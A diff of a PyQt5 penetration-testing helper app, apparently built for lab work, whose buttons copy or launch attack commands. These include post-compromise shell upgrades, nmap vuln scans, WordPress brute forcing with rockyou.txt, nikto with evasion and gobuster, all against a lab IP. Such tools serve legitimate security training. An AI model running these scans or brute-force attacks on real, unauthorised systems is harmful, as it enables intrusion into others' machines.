@@ -1,25 +1,37 @@
 #!/usr/bin/env python3
 import sys
-from PyQt5.QtWidgets import QApplication, QWidget, QDesktopWidget
-from PyQt5 import QtCore, QtGui, QtWidgets
-sys.path.insert(1, './')
-from Functions_h4d2 import frame1, grid
+from PyQt5.QtWidgets import *
+from PyQt5 import *
+from PyQt5.QtGui import *
+from PyQt5.QtCore import *
+import time
+import subprocess
+from subprocess import *
 
 class MainWindow(QWidget):
-
     def __init__(self):
         super().__init__()
+        self.layout = QVBoxLayout()
+        self.widgets = {
+            "logo": [],
+            "button_enter": [],
+            "divider": [],
+            "spacer" : [],
+            "nmap" : [],
+            }
+        self.lhost = "127.0.0.1"
         self.initUI()
 
     def initUI(self):
         self.setWindowTitle('H4D2')
-        self.setFixedHeight(650)
-        self.setFixedWidth(1000)
+        self.setMinimumSize(QtCore.QSize(1000, 650))
+        self.setSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
         self.setStyleSheet('background: #161219;')
-        frame1()
-        self.setLayout(grid)
+        self.frame1()
+        self.setLayout(self.grid)
         self.center()
         self.show()
+        self.textbox = QtWidgets.QTextEdit()
 
     def center(self):
         qr = self.frameGeometry()
@@ -27,7 +39,1825 @@ class MainWindow(QWidget):
         qr.moveCenter(cp)
         self.move(qr.topLeft())
 
+    def clear_widgets(self):
+        for i in reversed(range(self.grid.count())): 
+            self.grid.itemAt(i).widget().setParent(None)
+
+    def create_divider(self):
+        divider = QFrame()
+        divider.setFrameShape(QFrame.HLine)
+        divider.setLineWidth(3)
+        divider.setStyleSheet("color: #20C20E;")
+        return divider
+
+### Buttons ###
+    def frame1_button(self):
+        self.clear_widgets()
+        self.frame2()
+
+    def tabChanged(self, index):
+        current_tab = self.tabs.currentIndex()
+        if current_tab == 0:
+            self.IP()
+        elif current_tab == 1:
+            self.HTTPHelper()
+        elif current_tab == 2:
+            self.PassiveRecon()
+        elif current_tab ==3:
+            self.lpe()
+
+    def onActivated(self, text):
+        # Get the IP associated with the selected interface
+        ip = subprocess.check_output("ip addr show " + text + " | grep 'inet ' | awk '{print $2}' | cut -d/ -f1", shell=True)
+        self.lhost = ip.decode().strip()
+        self.lhost_label.setText("Lhost: " + self.lhost)
+        
+### Frames ###
+
+    def frame1(self):
+        self.grid = QGridLayout()
+        image = QPixmap("/opt/H4D2/logo2.png")
+        logo = QLabel()
+        logo.setPixmap(image)
+        logo.setAlignment(QtCore.Qt.AlignCenter)
+        self.widgets["logo"].append(logo)
+        button_enter = QPushButton("Enter", )
+        button_enter.setCursor(QCursor(QtCore.Qt.PointingHandCursor))
+        button_enter.setStyleSheet(
+            "*{border: 4px solid '#20C20e';" +
+            "border-radius: 10px;" +
+            "font-size: 20px;" +
+            "color: 'white';" +
+            "font-style: 'bold';" +
+            "padding: 10px;" +
+            "margin: 10px 600px;}" +
+            "*:hover{background: '#20C20e';}"
+        )
+        button_enter.clicked.connect(self.frame1_button)
+        button_enter.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Fixed)
+        self.widgets["button_enter"].append(button_enter)
+        self.grid.addWidget(logo, 2, 7, 4, 6)
+        self.grid.addWidget(button_enter, 8, 8, 1, 4)
+
+    def frame2(self):
+        ##############################################
+        self.tabs = QTabWidget()
+        self.tabs.setTabBarAutoHide(False)
+        self.tabs.currentChanged.connect(self.tabChanged)
+
+        # Create a horizontal layout for the Lhost label and dropdown
+        self.lhost_layout = QHBoxLayout()
+        self.lhost_label = QLabel("Lhost:")
+        self.lhost_label.setStyleSheet("color: 'white'; font-size: 16px;")
+        self.lhost_combo = QComboBox()
+        self.lhost_combo.activated[str].connect(self.onActivated)
+
+        # Get the list of available interfaces
+        interfaces = subprocess.check_output("ip link show", shell=True)
+        interface_list = interfaces.decode().split("\n")
+
+        # Extract the interface names and add them to the dropdown
+        for interface in interface_list:
+            if ": <" in interface:
+                self.lhost_combo.addItem(interface.split(":")[1].strip())
+
+        self.lhost_layout.addWidget(self.lhost_label)
+        self.lhost_layout.addWidget(self.lhost_combo)
+        self.lhost_layout.addStretch()
+        ##################################################
+        self.tabs.currentChanged.connect(self.tabChanged)
+        self.tabs.setFixedSize(self.size())
+        self.tabs.setSizePolicy(QtWidgets.QSizePolicy.Expanding, QtWidgets.QSizePolicy.Expanding)
+        self.tabs.tabBar().setStyleSheet("QTabBar::tab:selected { background-color: #20C20E}")
+        self.tab1 = QWidget()
+        self.tab2 = QWidget()
+        self.tab3 = QWidget()
+        self.tab4 = QWidget()
+        self.tabs.addTab(self.tab1, "Setup Options")
+        self.tabs.addTab(self.tab2, "HTTPHelper")
+        self.tabs.addTab(self.tab3, "Passive Recon")
+        self.tabs.addTab(self.tab4, "Linux Priv Esc")
+        self.tabs.setCurrentIndex(0)
+        #self.tabs.currentChanged.connect(self.tabChanged)
+        self.grid.addWidget(self.tabs, 0, 0, 1, 12)
+        self.grid.addLayout(self.lhost_layout, 1, 0, 1, 4)
+
+    def IP(self):
+        self.lhost
+        self.tab1.layout = QVBoxLayout()
+        self.scroll = QScrollArea()
+        self.container = QWidget()
+        self.container_layout = QVBoxLayout(self.container)
+        self.container.setLayout(self.container_layout)
+        self.scroll.setWidget(self.container)
+        self.scroll.setWidgetResizable(True)
+        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+        self.container_layout.setContentsMargins(0,0,0,0)
+        self.container.adjustSize()
+        spacer = QSpacerItem(0, 25)
+        divider = self.create_divider()
+        self.tab1.layout.addWidget(self.scroll)
+        self.tab1.setLayout(self.tab1.layout)
+
+
+
+        shellPE = QtWidgets.QLabel("[+ I just got a low-priv shell !]")
+        shellPE.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(shellPE)
+        shellPE_Scan1 = QtWidgets.QLabel(f"python -c 'import pty; pty.spawn(\"/bin/bash\")'")
+        shellPE_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(shellPE_Scan1)
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+        
+
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(shellPE_Scan1)
+        self.container_layout.addLayout(label_layout)
+        
+        shellPE_Scan2 = QtWidgets.QLabel(f"python3 -c 'import pty; pty.spawn(\"/bin/bash\")'")
+        shellPE_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(shellPE_Scan2)
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan2.text()))
+        copy_button.setStyleSheet(
+        "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(shellPE_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        shellPE_Scan3 = QtWidgets.QLabel("export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp")
+        shellPE_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +    
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(shellPE_Scan3)
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(shellPE_Scan3.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        self.container_layout.addLayout(label_layout)
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(shellPE_Scan3)
+        self.container_layout.addLayout(label_layout)
+#############################################################################  
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        self.container_layout.addStretch()
+
+    def HTTPHelper(self):
+        self.tab2.layout = QVBoxLayout()
+        self.scroll = QScrollArea()
+        self.container = QWidget()
+        self.container_layout = QVBoxLayout(self.container)
+        self.container.setLayout(self.container_layout)
+        self.scroll.setWidget(self.container)
+        self.scroll.setWidgetResizable(True)
+        self.container.setSizePolicy(QSizePolicy.Expanding, QSizePolicy.Expanding)
+        self.scroll.setVerticalScrollBarPolicy(Qt.ScrollBarAlwaysOn)
+        self.container_layout.setContentsMargins(0,0,0,0)
+        self.container.adjustSize()
+        spacer = QSpacerItem(0, 25)
+        divider = self.create_divider()
+        self.tab2.layout.addWidget(self.scroll)
+        self.tab2.setLayout(self.tab2.layout)
+        
+        Nmap = QtWidgets.QLabel("[+ Nmap]")
+        Nmap.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(Nmap)
+        
+        rhost = "10.11.1.71"
+        rport = "80"
+        lport = "4444"
+        
+        nmap_Scan1 = QtWidgets.QLabel(f"nmap -p- -sT -sV -A  {rhost}")
+        nmap_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(nmap_Scan1)
+        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmap_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(nmap_Scan1)
+        self.container_layout.addLayout(label_layout)
+        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command1 = nmap_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command1]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(nmap_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        nmap_Scan2  = QtWidgets.QLabel(f"nmap -p- -sC -sV {rhost} --open") 
+        nmap_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(nmap_Scan2)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmap_Scan2.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(nmap_Scan2)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command2 = nmap_Scan2.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command2]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(nmap_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        nmap_Scan3 = QtWidgets.QLabel(f"nmap -p- --script=vuln {rhost}")
+        nmap_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(nmap_Scan3)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmap_Scan3.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(nmap_Scan3)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command3 = nmap_Scan3.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command3]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(nmap_Scan3)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        NmapMethods = QtWidgets.QLabel("[+ HTTP Methods]")
+        NmapMethods.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(NmapMethods)
+##############################################################################        
+        nmapMethods_Scan1 = QtWidgets.QLabel("nmap --script http-methods --script-args http-methods.url-path='/website'")
+        nmapMethods_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(nmapMethods_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmapMethods_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(nmapMethods_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command4 = nmapMethods_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command4]))
+
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(nmapMethods_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        nmapMethods_Scan2 = QtWidgets.QLabel("nmap --script smb-enum-shares")
+        nmapMethods_Scan2.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(nmapMethods_Scan2)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmapMethods_Scan2.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(nmapMethods_Scan2)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command5 = nmapMethods_Scan2.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command5]))
+
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(nmapMethods_Scan2)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        nmapMethods_Scan3 = QtWidgets.QLabel("nmap -p80,443 --script=http-methods --script-args http-methods.url-path='/directory/goes/here'")
+        nmapMethods_Scan3.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(nmapMethods_Scan3)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nmapMethods_Scan3.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(nmapMethods_Scan3)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command6 = nmapMethods_Scan3.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command6]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(nmapMethods_Scan3)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        wpscanSSL = QtWidgets.QLabel("[+ WPScan & SSL]")
+        wpscanSSL.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wpscanSSL)
+##############################################################################        
+        wpscanSSL_Scan1 = QtWidgets.QLabel(f"wpscan --url http://{rhost}:{rport} --disable-tls-checks --enumerate p --enumerate t --enumerate u")
+        wpscanSSL_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wpscanSSL_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wpscanSSL_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wpscanSSL_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command7 = wpscanSSL_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command7]))
+
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wpscanSSL_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        wpscanBF = QtWidgets.QLabel("[+ WPScan Brute Forcing:]")
+        wpscanBF.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wpscanBF)
+##############################################################################        
+        wpscanBF_Scan1 = QtWidgets.QLabel(f"wpscan --url http://{rhost}:{rport} --disable-tls-checks -U users -P /usr/share/wordlists/rockyou.txt")
+        wpscanBF_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wpscanBF_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wpscanBF_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wpscanBF_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command8 = wpscanBF_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command8]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wpscanBF_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        wpscanAPD = QtWidgets.QLabel("[+ Aggressive Plugin Detection:]")
+        wpscanAPD.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(wpscanAPD)
+##############################################################################        
+        wpscanAPD_Scan1 = QtWidgets.QLabel(f"wpscan --url http://{rhost}:{rport} --enumerate p --plugins-detection aggressive")
+        wpscanAPD_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(wpscanAPD_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(wpscanAPD_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(wpscanAPD_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command9 = wpscanAPD_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command9]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(wpscanAPD_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        niktoSE = QtWidgets.QLabel("[+ Nikto with SSL and Evasion:]")
+        niktoSE.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(niktoSE)
+##############################################################################        
+        niktoSE_Scan1 = QtWidgets.QLabel(f"nikto --host http://{rhost}:{rport} -ssl -evasion 1")
+        niktoSE_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(niktoSE_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(niktoSE_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(niktoSE_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command10 = niktoSE_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command10]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(niktoSE_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        nikto = QtWidgets.QLabel("[+ Nikto Standard:]")
+        nikto.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(nikto)
+##############################################################################        
+        nikto_Scan1 = QtWidgets.QLabel(f"nikto --host http://{rhost}:{rport} -C all")
+        nikto_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(nikto_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(nikto_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(nikto_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command11 = nikto_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command11]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(nikto_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addWidget(self.create_divider())
+        self.container_layout.addSpacerItem(spacer)
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        gobusterDir = QtWidgets.QLabel("[+ Gobuster Directory]")
+        gobusterDir.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(gobusterDir)
+##############################################################################        
+        gobusterDir_Scan1 = QtWidgets.QLabel(f"gobuster dir -u http://{rhost}:{rport} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -l -k -t 30")
+        gobusterDir_Scan1.setStyleSheet(
+            "color: 'white';" +
+            "font-size: 20px;" +
+            "font-style: 'bold';" 
+        )
+        self.container_layout.addWidget(gobusterDir_Scan1)
+##############################################################################        
+        copy_button = QPushButton()
+        copy_button.setIcon(QIcon.fromTheme("edit-copy"))
+        copy_button.setFixedSize(QSize(20,20))
+        copy_button.clicked.connect(lambda: QApplication.clipboard().setText(gobusterDir_Scan1.text()))
+        copy_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        ) 
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(gobusterDir_Scan1)
+        self.container_layout.addLayout(label_layout)
+##############################################################################        
+        run_button = QPushButton()
+        run_button.setIcon(QIcon.fromTheme("media-playback-start"))
+        run_button.setFixedSize(QSize(20,20))
+        command12 = gobusterDir_Scan1.text() + "; bash"
+        run_button.clicked.connect(lambda: subprocess.Popen(["/usr/bin/terminator", "--new-tab", "-e", command12]))
+        run_button.setStyleSheet(
+            "*:hover{background: '#20C20e';}"
+        )    
+        label_layout = QHBoxLayout()
+        label_layout.addWidget(copy_button)
+        label_layout.addWidget(run_button)
+        label_layout.addWidget(gobusterDir_Scan1)
+        self.container_layout.addLayout(label_layout)
+#############################################################################        
+        self.container_layout.addSpacerItem(spacer)
+##############################################################################        
+        gobusterFile = QtWidgets.QLabel("[+ Gobuster Files]")
+        gobusterFile.setStyleSheet(
+            "color: #20C20E;" +
+            "font-size: 20px;" +
+            "font-style: 'bold';"
+        )
+        self.container_layout.addWidget(gobusterFile)
+##############################################################################        
